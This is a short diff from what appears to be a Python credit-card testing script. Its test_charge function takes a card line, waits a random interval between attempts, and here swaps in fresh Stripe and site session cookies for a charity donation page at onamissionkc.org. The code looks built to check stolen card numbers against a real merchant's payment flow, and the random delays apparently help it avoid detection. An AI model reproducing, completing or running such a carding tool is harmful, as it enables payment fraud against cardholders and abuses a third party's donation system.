@@ -266,13 +266,13 @@ def test_charge(cc_line):
 
         time.sleep(random.uniform(2, 4))
 
-  #      cookies = {  
-      #      'crumb': 'BVRL5cexgs+VYThiY2M1YzlmY2QyYzZmYzI4NjY3MGEzYWJiYmFm',  
-     #       'ss_cvr': '5e90dfdb-ab76-4349-8ffc-1d9e999c7c07|1761147863405|1761147863405|1761147863405|1',  
-     #       'ss_cvt': '1761147863405',  
-      #      '__stripe_mid': '99cca331-33bf-427d-8d4f-7cc8e19e970ee28e76',  
-      #      '__stripe_sid': 'a30a973c-8486-4e25-9f8c-0a7084facd963afccd',  
-      #  }  
+        cookies = {  
+            'crumb': 'BdN_kVc7Dlf8M2E3YmFkZGFkZDk4M2NjYjAzZjZkZWJlNDA2YTBj',  
+            #'ss_cvr': '5e90dfdb-ab76-4349-8ffc-1d9e999c7c07|1761147863405|1761147863405|1761147863405|1',  
+           # 'ss_cvt': '1761147863405',  
+            '__stripe_mid': '7b950d1e-0df3-409d-9e55-30a9793b59e7dff2e0',  
+            '__stripe_sid': 'dffa9c3f-a190-45e8-9152-dc0686c4aa83442b9c',  
+        }  
 
         headers = {  
             'Chargeority': 'www.onamissionkc.org',  
